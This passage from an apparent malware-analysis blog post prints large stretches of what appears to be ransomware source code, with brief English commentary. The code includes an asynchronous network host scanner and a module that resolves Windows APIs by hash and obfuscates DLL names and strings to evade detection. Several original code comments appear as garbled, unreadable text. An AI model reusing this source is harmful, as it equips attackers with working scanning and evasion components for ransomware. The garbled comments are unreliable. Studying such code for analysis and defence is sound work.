pExitThread(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line"></span><br><span class="line">		DWORD dwBytesTransferred;</span><br><span class="line">		ULONG_PTR CompletionStatus;</span><br><span class="line">		PCONNECT_CONTEXT ConnectContext;</span><br><span class="line"></span><br><span class="line">		BOOL Success = (BOOL)pGetQueuedCompletionStatus(g_IocpHandle, &amp;dwBytesTransferred, &amp;CompletionStatus, (LPOVERLAPPED*)&amp;ConnectContext, INFINITE);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (CompletionStatus == START_COMPLETION_KEY) &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ScanHosts();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">				pExitThread(EXIT_FAILURE);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (CompletionStatus == CONNECT_COMPLETION_KEY) &#123;</span><br><span class="line"></span><br><span class="line">			g_ActiveOperations--;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (Success &amp;&amp; CompleteAsyncConnect(ConnectContext-&gt;s)) &#123;</span><br><span class="line"></span><br><span class="line">				ConnectContext-&gt;State = CONNECTED;</span><br><span class="line">				AddHost(ConnectContext-&gt;dwAddres);</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				ConnectContext-&gt;State = NOT_CONNECTED;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!g_ActiveOperations &amp;&amp; IsTimerActivated) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (CompletionStatus == TIMER_COMPLETION_KEY) &#123;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = TRUE;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (g_ActiveOperations) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = <span class="literal">NULL</span>;</span><br><span class="line">				TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (ConnectCtx-&gt;State == CONNECTING) &#123;</span><br><span class="line">						pCancelIo((HANDLE)ConnectCtx-&gt;s);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pDeleteTimerQueue(hTimerQueue);</span><br><span class="line">	pExitThread(EXIT_SUCCESS);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Reference:</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/_fs/">MSDN</a></p>
<p>[Critical Section in Synchronization](</p>
<h2 id="api"><a href="#api" class="headerlink" title="api"></a>api</h2><h3 id="getapi"><a href="#getapi" class="headerlink" title="getapi"></a>getapi</h3><blockquote>
<p>#define KERNEL32DLL_HASH 0xb26771d8</p>
<p>#define LOADLIBRARYA_HASH 0x439c7e33</p>
</blockquote>
<p><strong>getapi::IsRestartManagerLoaded</strong>，<strong>getapi::SetRestartManagerLoaded</strong> function is used to KillFileOwner function.It will check if Rstrtmgr.dll is loaded.</p>
<p>self-realize function such as <strong>my_stoi、FindChar、m_memcpy、StrLen</strong></p>
<h4 id="getapi-InitializeGetapiModule"><a href="#getapi-InitializeGetapiModule" class="headerlink" title="getapi::InitializeGetapiModule"></a>getapi::InitializeGetapiModule</h4><p>first generate the function <code>LoadlibraryA</code></p>
<ul>
<li>GetKernel32</li>
<li>GetApiAddr</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">getapi::InitializeGetapiModule()</span><br><span class="line">&#123;</span><br><span class="line">	g_hKernel32 = GetKernel32();</span><br><span class="line">	morphcode(g_hKernel32);</span><br><span class="line"></span><br><span class="line">	ADDR dwLoadLibraryA;</span><br><span class="line">	pLoadLibraryA = (fnLoadLibraryA)GetApiAddr(g_hKernel32, LOADLIBRARYA_HASH, &amp;dwLoadLibraryA);</span><br><span class="line"></span><br><span class="line">	morphcode(pLoadLibraryA);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pLoadLibraryA) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	g_ApiCache = (LPVOID*)<span class="built_in">malloc</span>(API_CACHE_SIZE);</span><br><span class="line"></span><br><span class="line">	morphcode(g_ApiCache);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!g_ApiCache) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	RtlSecureZeroMemory(g_ApiCache, API_CACHE_SIZE);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="getapi-GetProcAddressEx"><a href="#getapi-GetProcAddressEx" class="headerlink" title="getapi::GetProcAddressEx"></a>getapi::GetProcAddressEx</h4><p>GetProcAddress by the ModuleName or the ModuleId follow.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">MODULES</span> &#123;</span></span><br><span class="line">	KERNEL32_MODULE_ID = <span class="number">15</span>,</span><br><span class="line">	ADVAPI32_MODULE_ID,</span><br><span class="line">	NETAPI32_MODULE_ID,</span><br><span class="line">	IPHLPAPI_MODULE_ID,</span><br><span class="line">	RSTRTMGR_MODULE_ID,</span><br><span class="line">	USER32_MODULE_ID,</span><br><span class="line">	WS2_32_MODULE_ID,</span><br><span class="line">	SHLWAPI_MODULE_ID,</span><br><span class="line">	SHELL32_MODULE_ID,</span><br><span class="line">	OLE32_MODULE_ID,</span><br><span class="line">	OLEAUT32_MODULE_ID,</span><br><span class="line">	NTDLL_MODULE_ID</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>pLoadLibraryA</li>
<li>GetApiAddr get the api function address by the Hash argument</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">LPVOID</span><br><span class="line"><span class="title function_">getapi::GetProcAddressEx</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in LPCSTR ModuleName, </span></span><br><span class="line"><span class="params">	__in DWORD ModuleId,</span></span><br><span class="line"><span class="params">	__in DWORD Hash</span></span><br><span class="line"><span class="params">	)</span></span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hModule = <span class="literal">NULL</span>;</span><br><span class="line">	ADDR ProcAddress = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	LPCSTR Advapi32DLL = OBFA(<span class="string">&quot;Advapi32.dll&quot;</span>);</span><br><span class="line">	LPCSTR Kernel32DLL = OBFA(<span class="string">&quot;Kernel32.dll&quot;</span>);</span><br><span class="line">	LPCSTR Netapi32DLL = OBFA(<span class="string">&quot;Netapi32.dll&quot;</span>);</span><br><span class="line">	LPCSTR IphlpapiDLL = OBFA(<span class="string">&quot;Iphlpapi.dll&quot;</span>);</span><br><span class="line">	LPCSTR RstrtmgrDLL = OBFA(<span class="string">&quot;Rstrtmgr.dll&quot;</span>);</span><br><span class="line">	LPCSTR Ws2_32DLL = OBFA(<span class="string">&quot;ws2_32.dll&quot;</span>);</span><br><span class="line">	LPCSTR User32DLL = OBFA(<span class="string">&quot;User32.dll&quot;</span>);</span><br><span class="line">	LPCSTR ShlwapiDLL = OBFA(<span class="string">&quot;Shlwapi.dll&quot;</span>);</span><br><span class="line">	LPCSTR Shell32DLL = OBFA(<span class="string">&quot;Shell32.dll&quot;</span>);</span><br><span class="line">	LPCSTR Ole32DLL = OBFA(<span class="string">&quot;Ole32.dll&quot;</span>);</span><br><span class="line">	LPCSTR OleAut32DLL = OBFA(<span class="string">&quot;OleAut32.dll&quot;</span>);</span><br><span class="line">	LPCSTR NtdllDLL = OBFA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ModuleName)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		morphcode((<span class="type">char</span>*)ModuleName);</span><br><span class="line"></span><br><span class="line">		hModule = pLoadLibraryA(ModuleName);</span><br><span class="line"></span><br><span class="line">		morphcode(hModule);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (hModule) &#123;</span><br><span class="line"></span><br><span class="line">			ProcAddress = GetApiAddr(hModule, Hash, &amp;ProcAddress);</span><br><span class="line"></span><br><span class="line">			morphcode(ProcAddress);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> (LPVOID)ProcAddress;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> (LPVOID)<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (ModuleId)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> KERNEL32_MODULE_ID:</span><br><span class="line">			ModuleName = Kernel32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> ADVAPI32_MODULE_ID:</span><br><span class="line">			ModuleName = Advapi32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> NETAPI32_MODULE_ID:</span><br><span class="line">			ModuleName = Netapi32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> IPHLPAPI_MODULE_ID:</span><br><span class="line">			ModuleName = IphlpapiDLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> RSTRTMGR_MODULE_ID:</span><br><span class="line">			ModuleName = RstrtmgrDLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> USER32_MODULE_ID:</span><br><span class="line">			ModuleName = User32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> WS2_32_MODULE_ID:</span><br><span class="line">			ModuleName = Ws2_32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> SHLWAPI_MODULE_ID:</span><br><span class="line">			ModuleName = ShlwapiDLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> SHELL32_MODULE_ID:</span><br><span class="line">			ModuleName = Shell32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> OLE32_MODULE_ID:</span><br><span class="line">			ModuleName = Ole32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> OLEAUT32_MODULE_ID:</span><br><span class="line">			ModuleName = OleAut32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> NTDLL_MODULE_ID:</span><br><span class="line">			ModuleName = NtdllDLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> (LPVOID)<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		hModule = pLoadLibraryA(ModuleName);</span><br><span class="line"></span><br><span class="line">		morphcode(hModule);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (hModule) &#123;</span><br><span class="line"></span><br><span class="line">			ProcAddress = GetApiAddr(hModule, Hash, &amp;ProcAddress);</span><br><span class="line"></span><br><span class="line">			morphcode(ProcAddress);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> (LPVOID)ProcAddress;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (LPVOID)<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="getapi-GetProcAddressEx2"><a href="#getapi-GetProcAddressEx2" class="headerlink" title="getapi::GetProcAddressEx2"></a>getapi::GetProcAddressEx2</h4><p>get the api function address by Hash</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(<span class="literal">NULL</span>, KERNEL32_MODULE_ID, <span class="number">0x1cae2a52</span>, <span class="number">109</span>);<span class="comment">//GetProcAddress(hKernel32, OBFA(&quot;CancelIo&quot;));</span></span><br></pre></td></tr></table></figure>

<p>the ApiCache is to forbid call GetProcAddressEx twice for the same function.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LPVOID </span><br><span class="line"><span class="title function_">getapi::GetProcAddressEx2</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in LPSTR Dll, </span></span><br><span class="line"><span class="params">	__in DWORD ModuleId, </span></span><br><span class="line"><span class="params">	__in DWORD Hash, </span></span><br><span class="line"><span class="params">	__in <span class="type">int</span> CacheIndex</span></span><br><span class="line"><span class="params">	)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 泽黻鲨 忸玮疣弪 噤疱?趔黻鲨?桉镱朦珞 挲?</span></span><br><span class="line">	LPVOID Addr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	Addr = g_ApiCache[CacheIndex];</span><br><span class="line">	morphcode(Addr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!Addr) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 泽黻鲨?礤??挲. 项塍鬣屐 甯 噤疱??漕徉怆屐 ?挲?</span></span><br><span class="line">		Addr = GetProcAddressEx(Dll, ModuleId, Hash);</span><br><span class="line"></span><br><span class="line">		morphcode(Addr);</span><br><span class="line"></span><br><span class="line">		g_ApiCache[CacheIndex] = Addr;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetForvardedProc"><a href="#GetForvardedProc" class="headerlink" title="GetForvardedProc"></a>GetForvardedProc</h4><p>first, this is the <strong>.dll</strong> string.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> szDll[] = &#123; <span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">// 泽黻鲨 钺疣犷蜿?镥疱磬珥圜屙? 耧铕蜞</span></span><br><span class="line"><span class="comment">// 袜 怩钿?漕腈磬 猁螯 耱痤赅 DllName.ProcName 桦?DllName.#ProcNomber</span></span><br><span class="line">--szDll[<span class="number">3</span>];</span><br><span class="line">szDll[<span class="number">1</span>]++;</span><br><span class="line">++szDll[<span class="number">2</span>];</span><br></pre></td></tr></table></figure>

<p>use the NameStr(ordNumber) to get each funtion of the dll.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">++NameStr;</span><br><span class="line">	<span class="keyword">if</span> (*NameStr == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		morphcode(*NameStr);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 褥 怆弪? 眍戾痤?趔黻鲨?</span></span><br><span class="line">		++NameStr;</span><br><span class="line"></span><br><span class="line">		morphcode(*NameStr);</span><br><span class="line"></span><br><span class="line">		DWORD OrdNomber = my_stoi(NameStr);</span><br><span class="line"></span><br><span class="line">		morphcode(OrdNomber);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> getapi::GetProcAddressEx(DLLName, <span class="number">0</span>, OrdNomber); </span><br></pre></td></tr></table></figure>

<p>or this will call this part of code, use the MurmurHash2A to import the function</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD Hash = MurmurHash2A(NameStr, StrLen(NameStr), HASHING_SEED);</span><br><span class="line"></span><br><span class="line">morphcode(Hash);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> getapi::GetProcAddressEx(DLLName, <span class="number">0</span>, Hash);</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">LPVOID</span><br><span class="line"><span class="title function_">GetForvardedProc</span><span class="params">(__in PCHAR Name)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> szDll[] = &#123; <span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">// 袜 怩钿?漕腈磬 猁螯 耱痤赅 DllName.ProcName 桦?DllName.#ProcNomber</span></span><br><span class="line">	--szDll[<span class="number">3</span>];</span><br><span class="line">	szDll[<span class="number">1</span>]++;</span><br><span class="line">	++szDll[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	morphcode(szDll);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Name == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	morphcode(Name);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> DLLName[<span class="number">256</span>];</span><br><span class="line">	<span class="comment">//m_memset(DLLName, 0, sizeof(DLLName));</span></span><br><span class="line">	RtlSecureZeroMemory(DLLName, <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">	morphcode(DLLName);</span><br><span class="line"></span><br><span class="line">	PCHAR NameStr = FindChar(Name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NameStr) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	morphcode(NameStr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/// 杨徼疣屐 桁 徼犭桀蝈觇</span></span><br><span class="line">	m_memcpy(DLLName, Name, NameStr - Name);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">strcat</span>(DLLName, szDll);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/// 铒疱溴?屐 桁 趔黻鲨?</span></span><br><span class="line">	++NameStr;</span><br><span class="line">	<span class="keyword">if</span> (*NameStr == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		morphcode(*NameStr);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 褥 怆弪? 眍戾痤?趔黻鲨?</span></span><br><span class="line">		++NameStr;</span><br><span class="line"></span><br><span class="line">		morphcode(*NameStr);</span><br><span class="line"></span><br><span class="line">		DWORD OrdNomber = my_stoi(NameStr);</span><br><span class="line"></span><br><span class="line">		morphcode(OrdNomber);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> getapi::GetProcAddressEx(DLLName, <span class="number">0</span>, OrdNomber); </span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD Hash = MurmurHash2A(NameStr, StrLen(NameStr), HASHING_SEED);</span><br><span class="line"></span><br><span class="line">	morphcode(Hash);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> getapi::GetProcAddressEx(DLLName, <span class="number">0</span>, Hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CheckForForvardedProc"><a href="#CheckForForvardedProc" class="headerlink" title="CheckForForvardedProc"></a>CheckForForvardedProc</h4><p>used to check if the dll function is all imported.</p>
